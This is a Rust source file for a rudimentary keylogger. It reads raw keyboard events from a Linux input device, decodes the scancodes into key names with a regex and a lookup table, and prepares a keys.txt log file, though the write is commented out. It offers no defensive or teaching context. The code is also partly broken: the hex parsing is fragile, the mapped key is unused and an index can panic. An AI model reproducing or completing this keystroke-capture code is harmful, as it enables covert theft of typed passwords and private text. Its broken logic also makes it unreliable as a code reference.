use std::fs::File;
use std::io::{self, Read, Write};
use regex::Regex;

fn main() -> io::Result<()> {

    let mut file = File::open("/dev/input/event2")?;
    let mut keys = File::create("keys.txt")?;

    for _ in 0..5000 {
        let mut buffer = [0u8; 128];
        let bytes_read = file.read(&mut buffer)?;
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:X}", element).as_str();
        } 
        let pattern = &builder[0..8];
        let extracted = extract_strings(builder.as_str(), pattern);
        let re = Regex::new(r"0000010(.+)").unwrap();

        let input_code;
        if let Some(captures) = re.captures(&extracted[1]) {
            if let Some(group) = captures.get(1) {
                let matched_text = group.as_str();
                input_code = &matched_text[..2];
                let my_key = match input_code {
                    // "01" => "[ESCAPE]",
                    // "02" => "1",
                    // "03" => "2",
                    // "04" => "3",
                    // "05" => "4",
                    // "06" => "5",
                    // "07" => "6",
                    // "08" => "7",
                    // "09" => "8",
                    // "0A" => "9",
                    // "0B" => "0",
                    "0C" => "[MINUS]",
                    "0D" => "[EQUAL]",
                    "0E" => "[BACKSPACE]",
                    "0F" => "[TAB]",
                    "10" => "q",
                    "11" => "w",
                    "12" => "e",
                    "13" => "r",
                    "14" => "t",
                    "15" => "y",
                    "16" => "u",
                    "17" => "i",
                    "18" => "o",
                    "19" => "p",
                    "1A" => "[LEFTBRACE]",
                    "1B" => "[RIGHTBRACE]",
                    "1C" => "[ENTER]",
                    "1D" => "[LEFTCTRL]",
                    "1E" => "a",
                    "1F" => "s",
                    "20" => "d",
                    "21" => "f",
                    "22" => "g",
                    "23" => "h",
                    "24" => "j",
                    "25" => "k",
                    "26" => "l",
                    "27" => "[SEMICOLON]",
                    "28" => "[APOSTROPHE]",
                    "29" => "[GRAVE]",
                    "2A" => "[LEFTSHIFT]",
                    "2B" => "[BACKSLASH]",
                    "2C" => "z",
                    "2D" => "x",
                    "2E" => "c",
                    "2F" => "v",
                    "30" => "b",
                    "31" => "n",
                    "32" => "m",
                    "39" => "[SPACE]",
                    _ => "[UNKNOWN]",
                };
                // keys.write_all(input_code.as_bytes()).unwrap();
                println!("{}", input_code);
            }
        }
    }
    Ok(())
}

fn extract_strings(input: &str, pattern: &str) -> Vec<String> {
    let mut result = Vec::new();

    let mut start_idx;
    let mut end_idx = 0;

    while let Some(start) = input[end_idx..].find(pattern) {
        start_idx = end_idx + start;

        if let Some(end) = input[start_idx + pattern.len()..].find(pattern) {
            end_idx = start_idx + pattern.len() + end;
            result.push(input[start_idx..end_idx].to_string());
        } else {
            break;
        }
    }

    result
}
